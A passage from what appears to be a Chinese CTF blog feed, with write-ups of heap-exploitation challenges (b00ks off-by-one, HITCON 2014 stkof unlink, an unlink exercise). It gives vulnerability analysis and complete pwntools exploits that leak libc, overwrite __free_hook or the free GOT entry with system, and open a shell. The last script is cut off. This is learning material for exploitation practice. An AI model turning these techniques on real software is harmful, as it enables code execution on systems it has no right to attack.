class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'b00ks'</span>)</span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter book name size: '</span>)</span><br><span class="line">    p.sendline(str(len(name)))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter book name (Max 32 chars): '</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter book description size: '</span>)</span><br><span class="line">    p.sendline(str(len(description)))</span><br><span class="line">    p.recvuntil(<span class="string">'Enter book description: '</span>)</span><br><span class="line">    p.send(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id you want to delete: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, description)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id you want to edit: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'new book description: '</span>)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    payload = <span class="string">'b'</span>*<span class="number">0xc0</span> + p64(<span class="number">1</span>) + p64(addr1) + p64(addr2) + p64(<span class="number">0x120</span>)</span><br><span class="line">    edit(<span class="number">1</span>, payload)</span><br><span class="line">    change_name(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">'Name: '</span>)</span><br><span class="line">    res = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露堆地址</span></span><br><span class="line">p.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">0x20</span>, <span class="string">'b'</span>*<span class="number">0x120</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">'Author: '</span>)</span><br><span class="line">heap_addr = u64(p.recvuntil(<span class="string">'\n'</span>)[<span class="number">32</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_addr: %#x"</span> % heap_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请一个大内存，让堆以mmap模式进行拓展，进而泄露libc_base</span></span><br><span class="line">create(<span class="string">'a'</span>*<span class="number">0x20</span>, <span class="string">'\x00'</span>*<span class="number">0x21000</span>)</span><br><span class="line">create(<span class="string">'/bin/sh\x00'</span>, <span class="string">'b'</span>*<span class="number">0x8</span>)</span><br><span class="line"><span class="comment">#heap_addr+0x70是以mmap拓展的堆的地址，将他写入伪造的book结构体的name中，准备泄露该值</span></span><br><span class="line"><span class="comment">#heap_addr_0xe0是chunk3的description指针，为之后任意写做准备</span></span><br><span class="line">libc_base = leak(heap_addr+<span class="number">0x70</span>, heap_addr+<span class="number">0xe0</span>) - <span class="number">0x5AD010</span> <span class="comment">#该值需要根据系统修改</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base: %#x"</span> % libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#计算地址</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system: %#x"</span> % system</span><br><span class="line"><span class="keyword">print</span> <span class="string">"free_hook: %#x"</span> % free_hook</span><br><span class="line"></span><br><span class="line"><span class="comment">#之前将chunk3的description指针的地址写到了伪造chunk的description指针处，所以这里将改写chunk3的description指针的值为free_hook</span></span><br><span class="line"><span class="comment">#因为off_one_byte会导致写入时会多往后覆盖一个字节，导致后方的book-&gt;size被覆盖为0，所以这里手动多写一个字节'\x08'，以免size被覆盖为0</span></span><br><span class="line">edit(<span class="number">1</span>, p64(free_hook)+<span class="string">'\x08'</span>)</span><br><span class="line"><span class="comment">#向free_hook中写入system</span></span><br><span class="line">edit(<span class="number">3</span>, p64(system))</span><br><span class="line"><span class="comment">#事先已经在chunk3的name中放入了/bin/sh\x00</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/Off_By_One/b00ks" target="_blank" rel="noopener">b00ks</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
            <tag> off_by_one </tag>
            
            <tag> ctfwiki </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hitcon2014-stkof writeup</title>
      <link href="/post/e7616071.html"/>
      <url>/post/e7616071.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2014<br>知识点：unlink<br>这道题没有菜单显示，只能通过分析代码来了解程序功能。<br><a id="more"></a></p><p>功能：</p><ol><li>添加（输入：长度）</li><li>修改（输入：索引、长度、内容）</li><li>删除（输入：索引）</li></ol><p>程序保护情况：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure><p></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>add函数中，对分配chunk的大小没有限制，将指针存到<strong>全局数组</strong>中，可获得指针变量的地址</p><p>set函数中，<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">set</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v2 = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !::s[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  n = atoll(&amp;s);</span><br><span class="line">  ptr = ::s[v2];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    n -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( n )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>对写入的长度没有限制，存在<strong>堆溢出</strong>，所以可以利用<strong>unlink漏洞</strong></p><p>delete函数中，释放掉堆块并把指针清零0</p><p>由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数）</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并）</li><li>在chunk1中构造fake chunk，<strong>准备unlink</strong><br><code>prevsize：0</code><br><code>size：0x80</code><br><code>fd：chunk_ptr - 0x18</code><br><code>bk：chunk_ptr - 0x10</code><br>注意：chunk_ptr是指向<code>chunk0的指针变量所在的地址</code>，而非指针指向的地址</li><li>从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）<br><code>prevsize: 0x80</code><br><code>size：0x90</code></li><li>释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18</li><li>把free的got表修改为puts。<br><code>payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)</code><br><code>set(1, payload)</code><br><code>set(2, p64(puts))</code></li><li>使用DynELF泄露system（详见代码）</li><li>利用（5）的方法，再将free的got表修改为system</li><li>向chunk3中写入<code>/bin/sh\x00</code>，释放chunk3，getshell</li></ol><h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(addr)</span><br><span class="line">    set(<span class="number">1</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    res = p.recvuntil(<span class="string">'OK\n'</span>).split(<span class="string">'\x0aOK'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">''</span>:</span><br><span class="line">        res = <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">return</span> res <span class="comment">#返回值可以为任意长度，并不清楚原因</span></span><br><span class="line"></span><br><span class="line">chunk_ptr = <span class="number">0x602148</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(chunk_ptr<span class="number">-0x18</span>) + p64(chunk_ptr<span class="number">-0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#freegot写为puts</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(free_got)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">set(<span class="number">2</span>, p64(puts))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr: %#x"</span> % system</span><br><span class="line"></span><br><span class="line"><span class="comment">#freegot写为system</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(free_got)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">set(<span class="number">2</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">set(<span class="number">3</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/unlink/hitcon2014_stkof/stkof" target="_blank" rel="noopener">stkof</a><br>相关题目：<a href="/post/503970b4.html">unlink例题</a><br>unlink漏洞分析：<a href="/post/dbc7b210.html">堆利用学习之unlink</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
            <tag> 堆利用 </tag>
            
            <tag> writeup </tag>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink例题</title>
      <link href="/post/503970b4.html"/>
      <url>/post/503970b4.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>先运行该程序，发现是一道典型的菜单题，有增删查改功能。<br>知识点：unlink<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap</span><br><span class="line">1.Add chunk</span><br><span class="line">2.Set chunk</span><br><span class="line">3.Delete chunk</span><br><span class="line">4.Print chunk</span><br><span class="line">5.Exit</span><br></pre></td></tr></table></figure><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>其中，<strong>add函数</strong>没有对申请的chunk大小做限制。<br>在<strong>set函数</strong>中：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> <span class="built_in">set</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">-1</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Set chunk index:"</span>, <span class="number">0x10</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> write(<span class="number">1</span>, <span class="string">"Set chunk data error!\n"</span>, <span class="number">0x16</span>u);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Set chunk data:"</span>, <span class="number">15u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf[v1], <span class="number">0x400</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>可以发现代码中没有对写入的长度做限制，<strong>存在溢出</strong><br>同时，buf[]中储存指向chunk的指针，且为<strong>全局变量</strong>，可以获得地址<br>由此确定程序中存在<strong>unlink漏洞</strong></p><p>在<strong>delete函数</strong>中：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">-1</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">"Delete chunk index:"</span>, <span class="number">0x13</span>u);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">free</span>(buf[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"Delete chunk error!\n"</span>, <span class="number">0x14</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>释放chunk后没有对指针赋0，会造成<strong>UAF漏洞</strong>，但此题不会利用到。</p><p>在print函数中，可输出任意index的chunk，用于<strong>泄露</strong>数据。</p><p>由于题目没有给出libc，所以需要用到DynELF来泄露system函数，可以利用unlink后修改chunk指针来实现任意读</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>分配3个连续的chunk，大小为0x80（smallchunk）<br><code>chunk0、chunk1: 用于构造unlink</code><br><code>chunk2：用于防止被top chunk合并</code></li><li>在chunk0中构造fake chunk，<strong>准备unlink</strong>。<br><code>prevsize：0</code><br><code>size：0x80</code><br><code>fd：chunk_ptr - 0xc</code><br><code>bk：chunk_ptr - 0x8</code><br>注意：chunk_ptr是指向<code>chunk0的指针变量所在的地址</code>，即&amp;buf[0]，而非指针指向的地址</li><li>从chunk0继续溢出到chunk1，修改prevsize、size（inuse位）<br><code>prevsize: 0x80</code><br><code>size：0x88</code></li><li>释放chunk1，触发unlink，此后buf[0]，即chunk0的指针的值被修改为了chunk_ptr-0xc</li><li>写入chunk0，<strong>构造leak函数，准备利用DynELF来泄露system</strong>，由于指针被修改，实际写入地址是chunk_ptr-0xc。<br><code>payload = &#39;a&#39; * 0xc //padding</code><br><code>payload += p32(chunk_ptr-0xc) //保留chunk0的指针，以便重复利用</code><br><code>payload += p32(addr) //将addr写入chunk1的指针(buf[1])</code><br>此后输出chunk1即为输出地址addr的值，实现可重复利用的任意地址读取</li><li>利用DynELF<strong>泄露出system</strong>函数地址</li><li>利用（5）的payload，将addr设为free_got，再向chunk1中写入system的地址。因为chunk1的指针被覆盖为free_got，所以会将<strong>system的地址写入free的got表</strong></li><li>向chunk2中写入<code>&#39;/bin/sh\x00&#39;</code>，调用<code>free(chunk2)</code>，因为free被覆盖为system，所以实际调用<code>system(chunk2)</code>，成功getshell</li></ol><h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'heap'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">chunk_ptr = <span class="number">0x8049d60</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('heap')</span></span><br><span class="line">p = remote(<span class="string">'127.0.0.1'</span>, <span class="number">4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_chunk</span><span class="params">(size)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the size of chunk you want to add:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_chunk</span><span class="params">(index, data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Set chunk index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">'Set chunk data:'</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete chunk index:'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_chunk</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Print chunk index:'</span>)</span><br><span 